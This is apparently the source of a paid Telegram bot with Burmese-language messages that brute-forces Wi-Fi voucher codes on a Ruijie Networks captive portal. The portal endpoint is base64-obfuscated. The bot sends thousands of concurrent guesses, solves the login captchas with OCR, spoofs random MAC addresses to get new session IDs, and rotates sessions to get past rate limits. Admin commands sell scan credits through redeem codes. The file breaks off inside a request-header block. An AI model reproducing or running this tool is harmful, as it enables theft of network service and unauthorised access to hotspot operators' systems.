import telebot, asyncio, aiohttp, json, base64, random, re, os, string, time, uuid, concurrent.futures
from telebot.async_telebot import AsyncTeleBot
from aiohttp import web
import cv2
import ddddocr
import numpy as np
from datetime import datetime, timedelta, timezone

BOT_TOKEN = os.environ.get("BOT_TOKEN", "")
GITHUB_TOKEN = os.environ.get("GITHUB_TOKEN", "")
REPO_OWNER = os.environ.get("REPO_OWNER", "wykhanthtal")
REPO_NAME = os.environ.get("REPO_NAME", "Ngaton")
ADMIN_ID = os.environ.get("ADMIN_ID", "5115562507")
bot = AsyncTeleBot(BOT_TOKEN)
_telegram_send = bot.send_message
_telegram_reply = bot.reply_to
_telegram_edit = bot.edit_message_text
user_data = {}
redeem_access = {}
redeem_lock = asyncio.Lock()
scan_tasks = {}
success_messages = {}
success_texts = {}
limited_messages = {}
limited_texts = {}
captcha_state = {}
retry_counts = {}
_session_pool = {}

session = None
_connector = None
_voucher_sem = None
_start_time = time.monotonic()

SESSION_POOL_LIMIT = 60
SESSION_POOL_SLOTS = 5
CONCURRENCY = 2500
BATCH_SIZE = 5000

async def handle(request):
    return web.Response(text="Bot is awake and running 24/7!")

async def web_server():
    app = web.Application()
    app.router.add_get('/', handle)
    runner = web.AppRunner(app)
    await runner.setup()
    port = int(os.environ.get('PORT', 8099))
    site = web.TCPSite(runner, '0.0.0.0', port)
    await site.start()
    print(f"Web server started on port {port}")

async def rebuild_session():
    global session, _connector
    if session and not session.closed:
        await session.close()
    if _connector and not _connector.closed:
        await _connector.close()
    timeout = aiohttp.ClientTimeout(total=30)
    _connector = aiohttp.TCPConnector(limit=6000, ttl_dns_cache=300, ssl=False)
    session = aiohttp.ClientSession(
        timeout=timeout,
        connector=_connector,
        connector_owner=False
    )

async def _drain_stdout(proc, idx):
    if proc and proc.stdout:
        try:
            async for _ in proc.stdout:
                pass
        except Exception:
            pass

async def get_file_content(path):
    url = f"https://api.github.com/repos/{REPO_OWNER}/{REPO_NAME}/contents/{path}"
    headers = {"Authorization": f"token {GITHUB_TOKEN}"}
    async with session.get(url, headers=headers) as response:
        if response.status == 200:
            data = await response.json()
            content = base64.b64decode(data['content']).decode('utf-8')
            return json.loads(content), data['sha']
    return {}, None

async def update_file_content(path, content, sha, message):
    url = f"https://api.github.com/repos/{REPO_OWNER}/{REPO_NAME}/contents/{path}"
    headers = {
        "Authorization": f"token {GITHUB_TOKEN}",
        "Content-Type": "application/json"
    }
    encoded = base64.b64encode(json.dumps(content).encode()).decode()
    payload = {
        "message": message,
        "content": encoded,
    }
    if sha:
        payload["sha"] = sha
    async with session.put(url, headers=headers, json=payload) as response:
        return await response.text()

TELEGRAM_MESSAGE_LIMIT = 3900
TELEGRAM_RETRY_LIMIT = 3

def split_telegram_message(text, max_chars=TELEGRAM_MESSAGE_LIMIT):
    if len(text) <= max_chars:
        return [text]
    chunks = []
    remaining = text
    while remaining:
        cut = min(max_chars, len(remaining))
        if cut < len(remaining):
            newline = remaining.rfind("\n", 0, cut)
            if newline > 0:
                cut = newline
        chunks.append(remaining[:cut].rstrip())
        remaining = remaining[cut:].lstrip()
    return chunks

async def safe_send_message(chat_id, text, **kwargs):
    for attempt in range(TELEGRAM_RETRY_LIMIT):
        try:
            return await _telegram_send(chat_id, text, **kwargs)
        except (asyncio.TimeoutError, aiohttp.ClientError) as error:
            if attempt == TELEGRAM_RETRY_LIMIT - 1:
                raise
            print(f"[telegram] send retry {attempt + 1}/{TELEGRAM_RETRY_LIMIT}: {error}")
            await asyncio.sleep(1 + attempt)

async def safe_reply_to(message, text, **kwargs):
    for attempt in range(TELEGRAM_RETRY_LIMIT):
        try:
            return await _telegram_reply(message, text, **kwargs)
        except (asyncio.TimeoutError, aiohttp.ClientError) as error:
            if attempt == TELEGRAM_RETRY_LIMIT - 1:
                raise
            print(f"[telegram] reply retry {attempt + 1}/{TELEGRAM_RETRY_LIMIT}: {error}")
            await asyncio.sleep(1 + attempt)

async def safe_edit_message_text(chat_id, message_id, text, **kwargs):
    for attempt in range(TELEGRAM_RETRY_LIMIT):
        try:
            return await _telegram_edit(
                chat_id=chat_id,
                message_id=message_id,
                text=text,
                **kwargs
            )
        except (asyncio.TimeoutError, aiohttp.ClientError) as error:
            if attempt == TELEGRAM_RETRY_LIMIT - 1:
                raise
            print(f"[telegram] edit retry {attempt + 1}/{TELEGRAM_RETRY_LIMIT}: {error}")
            await asyncio.sleep(1 + attempt)

async def update_chunked_messages(chat_id, title, items, message_ids=None):
    chunks = split_telegram_message(f"{title}\n\n" + "\n\n".join(items))
    message_ids = list(message_ids or [])
    for index, chunk in enumerate(chunks):
        if index < len(message_ids):
            try:
                await safe_edit_message_text(chat_id, message_ids[index], chunk)
                continue
            except Exception as error:
                print(f"[telegram] edit failed after retries: {error}")
        sent = await safe_send_message(chat_id, chunk)
        if index < len(message_ids):
            message_ids[index] = sent.message_id
        else:
            message_ids.append(sent.message_id)
    return message_ids

bot.send_message = safe_send_message
bot.reply_to = safe_reply_to
bot.edit_message_text = safe_edit_message_text

@bot.message_handler(commands=['start'])
async def start(message):
    await bot.reply_to(message, "Bot စတင်ပါပြီ။ /redeem <code> ဖြင့် access ရယူပါ။")

def generate_redeem_code(existing_codes):
    alphabet = string.ascii_uppercase + string.digits
    while True:
        code = ''.join(random.choice(alphabet) for _ in range(6))
        if code not in existing_codes:
            return code

async def redeem_user_access(chat_id):
    access = redeem_access.get(chat_id)
    if not access or access.get("uses_remaining", 0) <= 0:
        return False
    return True

async def consume_redeem_use(chat_id):
    async with redeem_lock:
        access = redeem_access.get(chat_id)
        if not access or access.get("uses_remaining", 0) <= 0:
            return False
        codes, sha = await get_file_content("redeem_codes.json")
        code = access["code"]
        entry = codes.get(code)
        if not entry or entry.get("claimed_by") != str(chat_id):
            redeem_access.pop(chat_id, None)
            return False
        remaining = int(entry.get("uses_remaining", 0))
        if remaining <= 0:
            redeem_access.pop(chat_id, None)
            return False
        entry["uses_remaining"] = remaining - 1
        await update_file_content(
            "redeem_codes.json", codes, sha,
            f"Consume redeem code {code} for {chat_id}"
        )
        access["uses_remaining"] = remaining - 1
        if access["uses_remaining"] <= 0:
            redeem_access.pop(chat_id, None)
        return True

@bot.message_handler(commands=['redeem'])
async def redeem(message):
    args = message.text.split()
    if len(args) != 2 or not re.fullmatch(r"[A-Z0-9]{6}", args[1].upper()):
        await bot.reply_to(message, "Usage: /redeem ABC123")
        return
    code = args[1].upper()
    chat_id = str(message.chat.id)
    async with redeem_lock:
        codes, sha = await get_file_content("redeem_codes.json")
        entry = codes.get(code)
        if not entry:
            await bot.reply_to(message, "Redeem code မတွေ့ပါ။")
            return
        claimed_by = entry.get("claimed_by")
        if claimed_by and claimed_by != chat_id:
            await bot.reply_to(message, "ဒီ redeem code ကို အခြား user က အသုံးပြုပြီးပါပြီ။")
            return
        remaining = int(entry.get("uses_remaining", 0))
        if remaining <= 0:
            await bot.reply_to(message, "ဒီ redeem code ရဲ့ access time ကုန်ဆုံးပါပြီ။")
            return
        entry["claimed_by"] = chat_id
        entry["claimed_at"] = datetime.now(timezone.utc).isoformat()
        await update_file_content(
            "redeem_codes.json", codes, sha,
            f"Redeem code {code} by {chat_id}"
        )
        redeem_access[message.chat.id] = {
            "code": code,
            "uses_remaining": remaining,
        }
    user_data[message.chat.id] = {}
    await bot.reply_to(message, f"Redeem အောင်မြင်ပါသည်။ Scan access ကျန်ရှိမှု: {remaining}")

@bot.message_handler(commands=['genredeem'])
async def genredeem(message):
    if str(message.chat.id) != ADMIN_ID:
        await bot.reply_to(message, "No Permission")
        return
    args = message.text.split()
    if len(args) not in (2, 3) or not args[1].isdigit() or int(args[1]) < 1:
        await bot.reply_to(message, "Usage: /genredeem <scan-count> [count]")
        return
    uses = int(args[1])
    count = int(args[2]) if len(args) == 3 and args[2].isdigit() else 1
    if count < 1 or count > 100:
        await bot.reply_to(message, "count သည် 1 မှ 100 အတွင်း ဖြစ်ရပါမည်။")
        return
    async with redeem_lock:
        codes, sha = await get_file_content("redeem_codes.json")
        generated = []
        for _ in range(count):
            code = generate_redeem_code(codes)
            codes[code] = {
                "uses_total": uses,
                "uses_remaining": uses,
                "claimed_by": None,
                "claimed_at": None,
                "created_at": datetime.now(timezone.utc).isoformat(),
            }
            generated.append(code)
        await update_file_content(
            "redeem_codes.json", codes, sha,
            f"Generate {count} redeem code(s)"
        )
    await bot.reply_to(message, "Generated redeem code(s):\n" + "\n".join(generated))

@bot.message_handler(commands=['listredeem'])
async def listredeem(message):
    if str(message.chat.id) != ADMIN_ID:
        await bot.reply_to(message, "No Permission")
        return
    codes, _ = await get_file_content("redeem_codes.json")
    if not codes:
        await bot.reply_to(message, "Redeem code မရှိသေးပါ။")
        return
    lines = [
        f"{code} | {entry.get('uses_remaining', 0)}/{entry.get('uses_total', 0)} | "
        f"user: {entry.get('claimed_by') or '-'}"
        for code, entry in codes.items()
    ]
    for index, chunk in enumerate(split_telegram_message("Redeem codes:\n" + "\n".join(lines))):
        if index == 0:
            await bot.reply_to(message, chunk)
        else:
            await safe_send_message(message.chat.id, chunk)


async def check_session_url(session_url):
    headers = {
        'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
        'accept-language': 'en-US,en;q=0.9',
        'priority': 'u=0, i',
        'referer': session_url,
        'sec-ch-ua': '"Chromium";v="148", "Microsoft Edge";v="148", "Not/A)Brand";v="99"',
        'sec-ch-ua-mobile': '?0',
        'sec-ch-ua-platform': '"Android"',
        'sec-fetch-dest': 'document',
        'sec-fetch-mode': 'navigate',
        'sec-fetch-site': 'same-origin',
        'upgrade-insecure-requests': '1',
        'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/148.0.0.0 Safari/537.36 Edg/148.0.0.0',
        'cookie': 'sensorsdata2015jssdkcross=%7B%22distinct_id%22%3A%2219e0ddbd9f2152-0df941f2efc6b08-4c657b58-1327104-19e0ddbd9f3a60%22%2C%22first_id%22%3A%22%22%2C%22props%22%3A%7B%22%24latest_traffic_source_type%22%3A%22%E8%87%AA%E7%84%B6%E6%90%9C%E7%B4%A2%E6%B5%81%E9%87%8F%22%2C%22%24latest_search_keyword%22%3A%22%E6%9C%AA%E5%8F%96%E5%88%B0%E5%80%BC%22%2C%22%24latest_referrer%22%3A%22https%3A%2F%2Fgemini.google.com%2F%22%7D%2C%22identities%22%3A%22eyIkaWRlbnRpdHlfY29va2llX2lkIjoiMTllMGRkYmQ5ZjIxNTItMGRmOTQxZjJlZmM2YjA4LTRjNjU3YjU4LTEzMjcxMDQtMTllMGRkYmQ5ZjNhNjAifQ%3D%3D%22%2C%22history_login_id%22%3A%7B%22name%22%3A%22%22%2C%22value%22%3A%22%22%7D%2C%22%24device_id%22%3A%2219e0ddbd9f2152-0df941f2efc6b08-4c657b58-1327104-19e0ddbd9f3a60%22%7D'
    }
    try:
        async with session.get(session_url, allow_redirects=True, headers=headers) as response:
            final_url = str(response.url)
            body = await response.text()
            print(f"[check_session_url] final_url={final_url} status={response.status}")
            if "sessionId" in final_url or "sessionId" in body:
                return True
            if response.status in (200, 302, 301):
                return True
            return False
    except Exception as e:
        print(f"[check_session_url] error: {e}")
        return False

@bot.message_handler(commands=['input'])
async def handle_input(message):
    chat_id = message.chat.id
    if not await redeem_user_access(chat_id):
        await bot.reply_to(message, "/input မလုပ်မီ /redeem <code> ကိုအရင်လုပ်ပေးပါ။")
        return

    args = message.text.split(maxsplit=1)
    if len(args) < 2:
        await bot.reply_to(
            message,
            "Usage:\n\n/input your_session_url"
        )
        return
    url = args[1]
    user_data.setdefault(chat_id, {})
    await bot.reply_to(message, "Session URL အားစစ်ဆေးနေပါသည်။")
    if await check_session_url(session_url=url):
        user_data[chat_id]['session_url'] = url
        await bot.reply_to(message, "Session URL သိမ်းပြီးပါပြီ။ Access ကျန်ရှိသရွေ့ /scan ကိုအသုံးပြုနိုင်ပါသည်။")
    else:
        await bot.reply_to(message, "Session URL မှားယွင်းနေပါသည်။")

@bot.message_handler(commands=['scan'])
async def scan(message):
    args = message.text.split(maxsplit=1)
    if len(args) < 2:
        await bot.reply_to(
            message,
            "Usage:\n\n/scan <6, 7, 8, ascii-lower, all>"
        )
        return
    mode = args[1]
    chat_id = message.chat.id
    if mode not in {"6", "7", "8", "all", "ascii-lower"}:
        await bot.reply_to(message, "Mode သည် 6, 7, 8, all, ascii-lower ထဲမှ တစ်ခုဖြစ်ရပါမည်။")
        return
    if not await redeem_user_access(chat_id):
        await bot.reply_to(message, "/scan မလုပ်မီ /redeem <code> ကိုအရင်လုပ်ပေးပါ။")
        return
    chat_id = message.chat.id
    if chat_id not in user_data:
        await bot.reply_to(message, "/scan မလုပ်မီ /input ဖြင့် Session URL ထည့်ပေးရပါမည်။")
        return
    if 'session_url' not in user_data[chat_id]:
        await bot.reply_to(message, "/scan ကိုအသုံးမပြုမီ /input ဖြင့် Session URL ကိုအရင်ထည့်သွင်းပေးရပါမည်။")
        return

    if (
        chat_id in scan_tasks
        and not scan_tasks[chat_id]["task"].done()
    ):
        await bot.reply_to(
            message,
            "/scan သည် အလုပ်လုပ်နေပြီဖြစ်သည် /scan ကိုထပ်မံမလုပ်ပါနှင့်။"
        )
        return

    if not await consume_redeem_use(chat_id):
        await bot.reply_to(message, "Redeem access time ကုန်ဆုံးပါပြီ။")
        return

    progress_msg = await safe_send_message(
        chat_id,
        "🔍Scanning Codes...\n\n")
    scan_id = str(uuid.uuid4())
    task = asyncio.create_task(
        run_bruteforce(
            mode,
            chat_id,
            user_data[chat_id]['session_url'],
            scan_id,
            message=message,
            progress_msg=progress_msg
        )
    )

    scan_tasks[chat_id] = {
        "task": task,
        "stop": False,
        "scan_id": scan_id,
        "checked": 0,
        "total": None,
        "speed": 0,
        "found": 0,
        "retries": 0,
        "start_time": time.monotonic(),
        "mode": None,
    }

@bot.message_handler(commands=['status'])
async def status(message):
    if str(message.chat.id) != ADMIN_ID:
        await bot.reply_to(message, "No Permission")
        return
    active_scans = sum(
        1 for data in scan_tasks.values()
        if not data["task"].done()
    )
    approved_users = sum(1 for chat_id in redeem_access if redeem_access[chat_id].get("uses_remaining", 0) > 0)
    uptime_seconds = int(time.monotonic() - _start_time)
    hours, remainder = divmod(uptime_seconds, 3600)
    minutes, seconds = divmod(remainder, 60)
    await bot.reply_to(
        message,
        f"📊 Bot Status\n\n"
        f"⏱ Uptime: {hours}h {minutes}m {seconds}s\n"
        f"🔍 Active Scans: {active_scans}\n"
        f"✅ Approved Users: {approved_users}\n"
        f"👥 Sessions Loaded: {len(user_data)}"
    )

@bot.message_handler(commands=['setconcurrency'])
async def set_concurrency(message):
    if str(message.chat.id) != ADMIN_ID:
        await bot.reply_to(message, "No Permission")
        return
    global CONCURRENCY
    args = message.text.split()
    if len(args) < 2 or not args[1].isdigit():
        await bot.reply_to(message, f"Usage: /setconcurrency 1000\nCurrent: {CONCURRENCY}")
        return
    CONCURRENCY = int(args[1])
    await bot.reply_to(message, f"✅ Concurrency set to {CONCURRENCY}")

@bot.message_handler(commands=['setbatch'])
async def set_batch(message):
    if str(message.chat.id) != ADMIN_ID:
        await bot.reply_to(message, "No Permission")
        return
    global BATCH_SIZE
    args = message.text.split()
    if len(args) < 2 or not args[1].isdigit():
        await bot.reply_to(message, f"Usage: /setbatch 1000\nCurrent: {BATCH_SIZE}")
        return
    BATCH_SIZE = int(args[1])
    await bot.reply_to(message, f"✅ Batch size set to {BATCH_SIZE}")

@bot.message_handler(commands=['stats'])
async def scan_stats(message):
    if str(message.chat.id) != ADMIN_ID:
        await bot.reply_to(message, "No Permission")
        return
    active = {cid: d for cid, d in scan_tasks.items() if not d["task"].done()}
    if not active:
        await bot.reply_to(message, "📭 No active scans running.")
        return
    lines = [f"📡 Live Scan Stats ({len(active)} active)\n"]
    for cid, d in active.items():
        checked = d.get("checked", 0)
        total = d.get("total")
        speed = d.get("speed", 0)
        found = d.get("found", 0)
        retries = d.get("retries", 0)
        mode = d.get("mode", "?")
        elapsed_s = int(time.monotonic() - d.get("start_time", time.monotonic()))
        h, rem = divmod(elapsed_s, 3600)
        m, s = divmod(rem, 60)
        elapsed_str = f"{h}h {m}m {s}s" if h else f"{m}m {s}s"
        if total:
            percent = (checked / total) * 100
            remaining_codes = total - checked
            eta_min = (remaining_codes / speed) if speed > 0 else None
            eta_str = f"{int(eta_min)}m" if eta_min is not None else "Unknown"
            lines.append(
                f"👤 User: {cid}\n"
                f"🎯 Mode: {mode}-digit\n"
                f"📦 Checked: {checked:,}/{total:,} ({percent:.1f}%)\n"
                f"⚡ Speed: {speed:,.0f} codes/min\n"
                f"✅ Found: {found} | 🔁 Retry: {retries}\n"
                f"⏱ Elapsed: {elapsed_str} | ETA: {eta_str}\n"
            )
        else:
            lines.append(
                f"👤 User: {cid}\n"
                f"🎯 Mode: {mode}\n"
                f"📦 Checked: {checked:,}\n"
                f"⚡ Speed: {speed:,.0f} codes/min\n"
                f"✅ Found: {found} | 🔁 Retry: {retries}\n"
                f"⏱ Elapsed: {elapsed_str}\n"
            )
    await bot.reply_to(message, "\n".join(lines))

@bot.message_handler(commands=['stop'])
async def stop_scan(message):
    chat_id = message.chat.id
    data = scan_tasks.get(chat_id)
    if data and not data["task"].done():
        data["stop"] = True
        data["scan_id"] = None
        for child_task in data.get("pending", set()):
            child_task.cancel()
        data["task"].cancel()
        success_messages.pop(chat_id, None)
        success_texts.pop(chat_id, None)
        limited_messages.pop(chat_id, None)
        limited_texts.pop(chat_id, None)
        retry_counts.pop(chat_id, None)
        _session_pool.pop(chat_id, None)
        await bot.reply_to(message, "/scan ကို ရပ်တန့်ပြီးပါပြီ။")
    else:
        await bot.reply_to(message, "/stop ဖြင့်ရပ်တန့်ရန် မည်သည့်အလုပ်မျှမရှိပါ။")

def digit_generator(length):
    return "".join(random.choice(string.digits) for _ in range(length))

strings = string.ascii_lowercase + string.digits
def all_generator(length=6):
    return "".join(random.choice(strings) for _ in range(length))

strings_2 = string.ascii_lowercase
def ascii_generator(length=6):
    return "".join(random.choice(strings_2) for _ in range(length))

def iter_codes(mode):
    if mode in ["6", "7"]:
        length = int(mode)
        total = 10 ** length
        start = random.randrange(total)
        step = random.randrange(1, total, 2)
        while step % 5 == 0:
            step = random.randrange(1, total, 2)
        for offset in range(total):
            yield str((start + offset * step) % total).zfill(length)
        return
    if mode == "8":
        while True:
            yield digit_generator(8)
    if mode == "ascii-lower":
        while True:
            yield ascii_generator(6)
    if mode == "all":
        while True:
            yield all_generator(6)
    raise ValueError(f"Unsupported scan mode: {mode}")

def format_progress(checked, total=None, speed=0, found=0, retries=0):
    speed_str = f"{speed:,.0f} codes/min"
    if total is not None:
        bar_length = 20
        percent = (checked / total) * 100
        filled = min(bar_length, int(percent / 5))
        bar = "█" * filled + "░" * (bar_length - filled)
        return (
            f"🔍Scanning Codes...\n\n"
            f"📦Checked : {checked:,}/{total:,}\n"
            f"📊Progress : {percent:.2f}%\n"
            f"⚡Speed : {speed_str}\n"
            f"✅Found : {found}\n"
            f"🔁Retry : {retries}\n"
            f"[{bar}]"
        )
    return (
        f"🔍Scanning Codes...\n\n"
        f"📦Checked : {checked:,}\n"
        f"⚡Speed : {speed_str}\n"
        f"✅Found : {found}\n"
        f"🔁Retry : {retries}\n"
        f"📊Status : running\n"
    )

def _captcha_entry(chat_id):
    if chat_id not in captcha_state:
        captcha_state[chat_id] = {
            "session_id": None,
            "auth_code": None,
            "lock": asyncio.Lock(),
        }
    return captcha_state[chat_id]

async def get_captcha(chat_id, session, session_url):
    entry = _captcha_entry(chat_id)
    if entry["session_id"] and entry["auth_code"]:
        return entry["session_id"], entry["auth_code"]
    async with entry["lock"]:
        if entry["session_id"] and entry["auth_code"]:
            return entry["session_id"], entry["auth_code"]
        session_id = await get_session_id(session, session_url, entry.get("session_id"))
        if not session_id:
            return None, None
        for _ in range(10):
            image = await Captcha_Image(session, session_id)
            text = await Captcha_Text(image)
            verified = await Varify_Captcha(session, session_id, text)
            if verified:
                entry["session_id"] = session_id
                entry["auth_code"] = text
                print(f"[captcha] solved sid={session_id} code={text}")
                return session_id, text
        return None, None

def invalidate_captcha(chat_id):
    entry = _captcha_entry(chat_id)
    entry["session_id"] = None
    entry["auth_code"] = None

async def run_bruteforce(mode, chat_id, session_url, scan_id, message=None, progress_msg=None):
    try:
        code_iter = iter_codes(mode)
    except ValueError as e:
        await safe_send_message(chat_id, str(e))
        return
    total = 10 ** int(mode) if mode in ["6", "7"] else None
    checked = 0
    scan_start = time.monotonic()
    if chat_id in scan_tasks:
        scan_tasks[chat_id]["total"] = total
        scan_tasks[chat_id]["mode"] = mode
        scan_tasks[chat_id]["start_time"] = scan_start
    global _voucher_sem
    effective_concurrency = CONCURRENCY
    _voucher_sem = asyncio.Semaphore(effective_concurrency)

    pending: set = set()
    if chat_id in scan_tasks:
        scan_tasks[chat_id]["pending"] = pending
    last_update = time.monotonic()

    async def _check(code):
        async with _voucher_sem:
            return await perform_check(
                session_url, code, chat_id, scan_id, message=message
            )

    async def _flush_progress():
        nonlocal last_update
        now = time.monotonic()
        if now - last_update < 2.0:
            return
        last_update = now
        elapsed = now - scan_start
        speed = (checked / elapsed * 60) if elapsed > 0 else 0
        found = len(success_texts.get(chat_id, []))
        retries = retry_counts.get(chat_id, 0)
        if chat_id in scan_tasks:
            scan_tasks[chat_id]["checked"] = checked
            scan_tasks[chat_id]["speed"] = speed
            scan_tasks[chat_id]["found"] = found
            scan_tasks[chat_id]["retries"] = retries
        text = format_progress(checked, total, speed, found, retries)
        try:
            await safe_edit_message_text(
                chat_id=chat_id,
                message_id=progress_msg.message_id,
                text=text
            )
        except Exception:
            try:
                new_msg = await safe_send_message(chat_id, text)
                progress_msg.message_id = new_msg.message_id
            except Exception as err:
                print(f"Progress Message Error: {err}")

    try:
        for code in code_iter:
            # Stop / cancelled check
            current_task = scan_tasks.get(chat_id)
            if not current_task or current_task.get("scan_id") != scan_id:
                break
            if current_task.get("stop"):
                scan_tasks.pop(chat_id, None)
                success_messages.pop(chat_id, None)
                success_texts.pop(chat_id, None)
                break

            # Launch task; discard from pending set on completion
            t = asyncio.create_task(_check(code))
            pending.add(t)
            t.add_done_callback(pending.discard)

            # When at capacity: wait for at least one to finish before adding more
            if len(pending) >= effective_concurrency:
                done, _ = await asyncio.wait(pending, return_when=asyncio.FIRST_COMPLETED)
                checked += len(done)
                await _flush_progress()

        # Drain remaining in-flight tasks
        while pending:
            done, _ = await asyncio.wait(pending, return_when=asyncio.FIRST_COMPLETED)
            checked += len(done)

        if progress_msg:
            final_found = len(success_texts.get(chat_id, []))
            final_retries = retry_counts.get(chat_id, 0)
            finish_text = (
                "🔍Scanning Completed\n\n"
                f"📦Checked : {checked:,}\n"
                f"✅Found : {final_found}\n"
                f"🔁Retry : {final_retries}\n"
                "📊Progress : 100%\n"
                "[████████████████████]"
            )
            try:
                await safe_edit_message_text(
                    chat_id=chat_id,
                    message_id=progress_msg.message_id,
                    text=finish_text
                )
            except Exception:
                try:
                    await safe_send_message(chat_id, finish_text)
                except Exception as err:
                    print(f"Progress Finish Message Error: {err}")
        scan_tasks.pop(chat_id, None)
        success_messages.pop(chat_id, None)
        success_texts.pop(chat_id, None)
        limited_messages.pop(chat_id, None)
        limited_texts.pop(chat_id, None)
        retry_counts.pop(chat_id, None)
        _session_pool.pop(chat_id, None)
    finally:
        for child_task in pending:
            if not child_task.done():
                child_task.cancel()
        if pending:
            await asyncio.gather(*pending, return_exceptions=True)
        scan_tasks.pop(chat_id, None)
        success_messages.pop(chat_id, None)
        success_texts.pop(chat_id, None)
        limited_messages.pop(chat_id, None)
        limited_texts.pop(chat_id, None)
        retry_counts.pop(chat_id, None)
        _session_pool.pop(chat_id, None)


def get_mac():
    first_byte = random.choice([0x02, 0x06, 0x0A, 0x0E])
    mac = [first_byte] + [random.randint(0x00, 0xff) for _ in range(5)]
    return ':'.join(f'{x:02x}' for x in mac)

async def get_session_id(session, session_url, previous_session_id=None):
    mac = get_mac()
    session_url = replace_mac(session_url, new_mac=mac)
    headers = {
        'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
        'accept-language': 'en-US,en;q=0.9',
        'priority': 'u=0, i',
        'referer': session_url,
        'sec-ch-ua': '"Chromium";v="148", "Microsoft Edge";v="148", "Not/A)Brand";v="99"',
        'sec-ch-ua-mobile': '?0',
        'sec-ch-ua-platform': '"Android"',
        'sec-fetch-dest': 'document',
        'sec-fetch-mode': 'navigate',
        'sec-fetch-site': 'same-origin',
        'upgrade-insecure-requests': '1',
        'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/148.0.0.0 Safari/537.36 Edg/148.0.0.0',
        'cookie': 'sensorsdata2015jssdkcross=%7B%22distinct_id%22%3A%2219e0ddbd9f2152-0df941f2efc6b08-4c657b58-1327104-19e0ddbd9f3a60%22%2C%22first_id%22%3A%22%22%2C%22props%22%3A%7B%22%24latest_traffic_source_type%22%3A%22%E8%87%AA%E7%84%B6%E6%90%9C%E7%B4%A2%E6%B5%81%E9%87%8F%22%2C%22%24latest_search_keyword%22%3A%22%E6%9C%AA%E5%8F%96%E5%88%B0%E5%80%BC%22%2C%22%24latest_referrer%22%3A%22https%3A%2F%2Fgemini.google.com%2F%22%7D%2C%22identities%22%3A%22eyIkaWRlbnRpdHlfY29va2llX2lkIjoiMTllMGRkYmQ5ZjIxNTItMGRmOTQxZjJlZmM2YjA4LTRjNjU3YjU4LTEzMjcxMDQtMTllMGRkYmQ5ZjNhNjAifQ%3D%3D%22%2C%22history_login_id%22%3A%7B%22name%22%3A%22%22%2C%22value%22%3A%22%22%7D%2C%22%24device_id%22%3A%2219e0ddbd9f2152-0df941f2efc6b08-4c657b58-1327104-19e0ddbd9f3a60%22%7D'
    }
    try:
        async with session.get(session_url, headers=headers, allow_redirects=True) as req:
            response = str(req.url)
            print(f"[get_session_id] status={req.status} final_url={response}")
            session_id = re.search(r"[?&]sessionId=([a-zA-Z0-9]+)", response)
            if session_id:
                print(f"[get_session_id] found sessionId={session_id.group(1)}")
                return session_id.group(1)
            else:
                print(f"[get_session_id] no sessionId in URL, returning previous={previous_session_id}")
                return previous_session_id
    except Exception as e:
        print(f"[get_session_id] ERROR url={session_url[:80]} exception={type(e).__name__}: {e}")
        return previous_session_id

def replace_mac(url, new_mac):
    url = re.sub(r'(?<=mac=)[^&]+', new_mac, url)
    return url

async def get_pooled_session_id(chat_id, task_session, session_url):
    if chat_id not in _session_pool:
        _session_pool[chat_id] = {
            "slots": [{"session_id": None, "uses": 0, "lock": asyncio.Lock()} for _ in range(SESSION_POOL_SLOTS)],
            "rr": 0
        }
    pool = _session_pool[chat_id]

    # Round-robin: find any slot with remaining capacity
    for i in range(SESSION_POOL_SLOTS):
        idx = (pool["rr"] + i) % SESSION_POOL_SLOTS
        entry = pool["slots"][idx]
        if entry["session_id"] and entry["uses"] < SESSION_POOL_LIMIT:
            pool["rr"] = (idx + 1) % SESSION_POOL_SLOTS
            entry["uses"] += 1
            return entry["session_id"]

    # All slots exhausted — refresh the next slot (non-blocking for others)
    idx = pool["rr"] % SESSION_POOL_SLOTS
    pool["rr"] = (pool["rr"] + 1) % SESSION_POOL_SLOTS
    entry = pool["slots"][idx]
    async with entry["lock"]:
        if entry["session_id"] and entry["uses"] < SESSION_POOL_LIMIT:
            entry["uses"] += 1
            return entry["session_id"]
        new_sid = await get_session_id(task_session, session_url, entry["session_id"])
        if new_sid:
            entry["session_id"] = new_sid
            entry["uses"] = 1
            print(f"[session-pool] chat={chat_id} slot={idx} new sessionId={new_sid}")
        return entry["session_id"]

async def perform_check(session_url, code, chat_id, scan_id=None, recheck=False, message=None):
    if not recheck:
        current_task = scan_tasks.get(chat_id)
        if not current_task or current_task.get("scan_id") != scan_id:
            return

    post_url = base64.b64decode(
        b'aHR0cHM6Ly9wb3J0YWwtYXMucnVpamllbmV0d29ya3MuY29tL2FwaS9hdXRoL3ZvdWNoZXIvP2xhbmc9ZW5fVVM='
    ).decode()

    response = None
    for _attempt in range(3):
        timeout = aiohttp.ClientTimeout(total=30)
        conn = _connector

        async with aiohttp.ClientSession(
            connector=conn,
            connector_owner=False,
            cookie_jar=aiohttp.CookieJar(),
            timeout=timeout
        ) as task_session:

            session_id = await get_pooled_session_id(chat_id, task_session, session_url)
            if not session_id:
                return

            auth_code = None
            for _ in range(3):
                try:
                    image = await Captcha_Image(task_session, session_id)
                    text = await Captcha_Text(image)
                    if not text:
                        continue
                    verified = await Varify_Captcha(task_session, session_id, text)
                    if verified:
                        auth_code = text
                        break
                except Exception as e:
                    print(f"[perform_check] captcha error: {e}")
            if not auth_code:
                return

            if not recheck:
                current_task = scan_tasks.get(chat_id)
                if not current_task or current_task.get("scan_id") != scan_id or current_task.get("stop"):
                    return

            data = {
                "accessCode": code,
                "sessionId": session_id,
                "apiVersion": 1,
                "authCode": auth_code,
            }
            headers = {
                "authority": "portal-as.ruijienetworks.com",
                "accept": "*/*",
                "accept-language": "en-US,en;q=0.9",
                "content-type": "application/json",
                "origin": "https://portal-as.ruijienetworks.com",
                "referer": (
                    f"https://portal-as.ruijienetworks.com/download/static/maccauth/src/index.html"
                    f"?RES=./../expand/res/mrlev58jlgslg49ervu&IS_EG=0&sessionId={session_id}"
                ),
                "sec-ch-ua": '"Chromium";v="139", "Not;A=Brand";v="99"',
                "sec-ch-ua-mobile": "?1",
                "sec-ch-ua-platform": '"Android"',
                "sec-fetch-dest": "empty",
                "sec-fetch-mode": "cors",
